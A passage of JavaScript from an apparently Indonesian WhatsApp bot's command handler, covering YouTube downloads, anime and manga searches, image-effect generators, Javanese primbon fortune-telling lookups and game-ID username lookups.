                zaki.sendImage(m.chat, media.thumb, `➣ Title : ${media.title}\n➣ File Size : ${media.filesizeF}\n➣ Url : ${urls[text - 1]}\n➣ Ext : MP3\n➣ Resolusi : ${args[1] || '128kbps'}`, m)
                zaki.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                zaki.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `➣ Title : ${media.title}\n➣ File Size : ${media.filesizeF}\n➣ Url : ${urls[text - 1]}\n➣ Ext : MP3\n➣ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                load(`Loading...`)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                zaki.sendMessage(m.chat, { image: { url: result }, caption: '➣ Media Url : '+result }, { quoted: m })
            }
            break
case 'webtonsearch': case 'webtoon':
                if (!text) return m.reply('Yang mau di cari apa?')
                await load(`Loading...`)
                xfar.Webtoons(q).then(async data => {
                    let txt = `*------「 WEBTOONS-SEARCH 」------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*👍🏻 Like :* ${i.like}\n`
                        txt += `*🤴🏻 Creator :* ${i.creator}\n`
                        txt += `*🎥 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n ----------------------------------------------------------\n`
                    }
                    await reply(txt)
                })
                .catch((err) => {
                    m.reply(mess.error)
                })
            break
            case 'drakor':
                if (!text) return m.reply('Yang mau di cari apa?')
                await load(`Loading...`)
                xfar.Drakor(`${text}`).then(async data => {
                    let txt = `*-----「 DRAKOR-SEARCH 」-----*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📆 Years :* ${i.years}\n`
                        txt += `*🎥 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n-----------------------------------------------------\n`
                    }
                    await sendFileFromUrl(from,data[0].thumbnail,txt,m)
                })
                .catch((err) => {
                    m.reply(mess.error)
                })
            break
            case 'anime':{
                if (!text) return m.reply('Yang mau di cari apa?')
                await load(`Loading...`)
                xfar.Anime(q).then(async data => {
                    let txt = `*-------「 ANIME-SEARCH 」-------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await zaki.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                })
                .catch((err) => {
                    m.reply(mess.error)
                })
                }
            break
            case 'character': case 'karakter':
                if (!text) return m.reply('Yang mau di cari apa?')
                await load(`Loading...`)
                xfar.Character(q).then(async data => {
                    let txt = `*---「 CHARACTER-SEARCH 」---*\n\n`
                    for (let i of data) {
                        txt += `*📫 Character :* ${i.character}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await zaki.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                })
                .catch((err) => {
                    m.reply(mess.error)
                })
            break
            case 'manga':
                if (!text) return m.reply('Yang mau di cari apa?')
                await load(`Loading...`)
                xfar.Manga(`${text}`).then(async data => {
                    let txt = `*------「 MANGA-SEARCH 」------*\n\n`
                    for (let i of data) {
                         txt += `*📫 Title :* ${i.judul}\n`
                         txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await zaki.send5ButLoc(from, txt , `© ${ownername}`,gam, but , { userJid: m.chat, quoted: m })
                })
                .catch((err) => {
                    m.reply(mess.error)
                })
            break



            


	    case 'couple': {
                load(`Loading...`)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                zaki.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                zaki.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: zaki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `➣ Title : ${result.title}\n➣ Category : ${result.type}\n➣ Detail : ${result.source}\n➣ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: zaki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `➣ Title : ${result.title}\n➣ Source : ${result.source}\n➣ Media Url : ${result.image}`,
                    footer: zaki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                zaki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
                if (!text) throw `Example : ${prefix + command} text`
                load(`Loading...`)
                zaki.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                if (!text) throw 'No Query Text'
                load(`Loading...`)
                zaki.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                load(`Loading...`)
                zaki.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nomor HP :* ${anu.message.nomer_hp}\n➣ *Angka Shuzi :* ${anu.message.angka_shuzi}\n➣ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n➣ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Mimpi :* ${anu.message.mimpi}\n➣ *Arti :* ${anu.message.arti}\n➣ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama Anda :* ${anu.message.nama_anda.nama}\n➣ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➣ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➣ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➣ *Hasil :* ${anu.message.result}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama Anda :* ${anu.message.nama_anda.nama}\n➣ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➣ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➣ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➣ *Hasil :* ${anu.message.result}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama Suami :* ${anu.message.suami.nama}\n➣ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n➣ *Nama Istri :* ${anu.message.istri.nama}\n➣ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n➣ *Hasil :* ${anu.message.result}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama Anda :* ${anu.message.nama_anda.nama}\n➣ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n➣ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n➣ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n➣ *Sisi Positif :* ${anu.message.sisi_positif}\n➣ *Sisi Negatif :* ${anu.message.sisi_negatif}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama :* ${anu.message.nama}\n➣ *Arti :* ${anu.message.arti}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama :* ${anu.message.nama}\n➣ *Lahir :* ${anu.message.tgl_lahir}\n➣ *Life Path :* ${anu.message.life_path}\n➣ *Destiny :* ${anu.message.destiny}\n➣ *Destiny Desire :* ${anu.message.destiny_desire}\n➣ *Personality :* ${anu.message.personality}\n➣ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendImage(m.chat,  anu.message.gambar, `➣ *Nama Anda :* ${anu.message.nama_anda}\n➣ *Nama Pasangan :* ${anu.message.nama_pasangan}\n➣ *Sisi Positif :* ${anu.message.sisi_positif}\n➣ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Tanggal Pernikahan :* ${anu.message.tanggal}\n➣ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Lahir :* ${anu.message.hari_lahir}\n➣ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Lahir :* ${anu.message.hari_lahir}\n➣ *Rezeki :* ${anu.message.rejeki}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Lahir :* ${anu.message.hari_lahir}\n➣ *Pekerjaan :* ${anu.message.pekerjaan}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Analisa :* ${anu.message.analisa}\n➣ *Angka Akar :* ${anu.message.angka_akar}\n➣ *Sifat :* ${anu.message.sifat}\n➣ *Elemen :* ${anu.message.elemen}\n➣ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Analisa :* ${anu.message.analisa}\n➣ *Sektor :* ${anu.message.sektor}\n➣ *Elemen :* ${anu.message.elemen}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendImage(m.chat, anu.message.image, `➣ *Lahir :* ${anu.message.tgl_lahir}\n➣ *Simbol Tarot :* ${anu.message.simbol_tarot}\n➣ *Arti :* ${anu.message.arti}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama :* ${anu.message.nama}\n➣ *Lahir :* ${anu.message.tahun_lahir}\n➣ *Gender :* ${anu.message.jenis_kelamin}\n➣ *Angka Kua :* ${anu.message.angka_kua}\n➣ *Kelompok :* ${anu.message.kelompok}\n➣ *Karakter :* ${anu.message.karakter}\n➣ *Sektor Baik :* ${anu.message.sektor_baik}\n➣ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Lahir :* ${anu.message.tgl_lahir}\n➣ *Kala Tinantang :* ${anu.message.kala_tinantang}\n➣ *Info :* ${anu.message.info}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Lahir :* ${anu.message.tgl_lahir}\n➣ *Hasil :* ${anu.message.result}\n➣ *Info :* ${anu.message.info}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Hari Lahir :* ${anu.message.hari_lahir}\n➣ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n➣ *Hari Naas :* ${anu.message.hari_naas}\n➣ *Info :* ${anu.message.catatan}\n➣ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Hari Lahir :* ${anu.message.hari_lahir}\n➣ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n➣ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Hari Lahir :* ${anu.message.hari_lahir}\n➣ *tanggal Lahir :* ${anu.message.tgl_lahir}\n➣ *Arah Rezeki :* ${anu.message.arah_rejeki}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama :* ${anu.message.nama}\n➣ *Lahir :* ${anu.message.tgl_lahir}\n➣ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n➣ *Hasil :* ${anu.message.result}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Tanggal :* ${anu.message.tanggal}\n➣ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n➣ *Watak Hari :* ${anu.message.watak_hari}\n➣ *Naga Hari :* ${anu.message.naga_hari}\n➣ *Jam Baik :* ${anu.message.jam_baik}\n➣ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama :* ${anu.message.nama}\n➣ *Lahir :* ${anu.message.tgl_lahir}\n➣ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Nama :* ${anu.message.nama}\n➣ *Lahir :* ${anu.message.tgl_lahir}\n➣ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Tanggal :* ${anu.message.tgl_memancing}\n➣ *Hasil :* ${anu.message.result}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Hasil :* ${anu.message.result}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Zodiak :* ${anu.message.zodiak}\n➣ *Nomor :* ${anu.message.nomor_keberuntungan}\n➣ *Aroma :* ${anu.message.aroma_keberuntungan}\n➣ *Planet :* ${anu.message.planet_yang_mengitari}\n➣ *Bunga :* ${anu.message.bunga_keberuntungan}\n➣ *Warna :* ${anu.message.warna_keberuntungan}\n➣ *Batu :* ${anu.message.batu_keberuntungan}\n➣ *Elemen :* ${anu.message.elemen_keberuntungan}\n➣ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n➣ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                zaki.sendText(m.chat, `➣ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
